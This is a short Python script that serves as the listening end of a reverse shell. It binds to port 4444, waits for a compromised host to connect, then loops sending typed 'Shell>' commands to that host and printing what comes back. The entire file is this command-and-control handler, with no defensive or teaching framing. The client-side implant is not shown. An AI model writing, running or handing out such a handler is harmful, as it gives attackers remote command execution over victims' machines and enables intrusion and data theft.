import socket

HOST = '0.0.0.0'
PORT = 4444

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
print(f"[+] Listening on port {PORT}...")

client, addr = s.accept()
print(f"[+] Connection from {addr}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        client.send(b"exit")
        break
    client.send(command.encode())
    result = client.recv(4096).decode()
    print(result)

client.close()
s.close()
